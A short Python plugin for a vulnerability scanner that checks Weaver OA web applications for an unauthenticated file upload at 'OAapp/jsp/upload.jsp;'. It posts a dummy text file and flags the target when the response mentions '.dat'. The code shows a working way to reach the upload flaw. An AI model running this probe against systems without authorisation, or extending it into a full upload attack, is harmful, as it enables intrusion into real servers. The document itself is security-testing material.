#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript
from aiohttp import FormData

class Script(BaseScript):
    """
    weaver bsh
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        url = path + "OAapp/jsp/upload.jsp;"
                        form = FormData()
                        form.add_field('file', "1", filename="1.txt", content_type='application/octet-stream')
                        async with session.post(url=url, data=form) as res:
                            if res:
                                text = await res.text()
                                if '.dat' in text:
                                    yield url